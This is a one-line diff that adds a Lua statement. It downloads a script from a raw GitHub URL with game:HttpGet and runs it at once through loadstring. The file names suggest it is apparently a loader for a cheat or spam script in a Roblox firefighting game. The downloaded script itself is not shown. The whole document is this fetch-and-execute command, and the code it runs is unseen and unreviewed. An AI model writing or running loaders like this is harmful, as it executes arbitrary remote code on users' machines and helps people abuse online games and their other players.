@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/firefighting-sim-spam5-4rplcqp1fbcp97.lua"))()
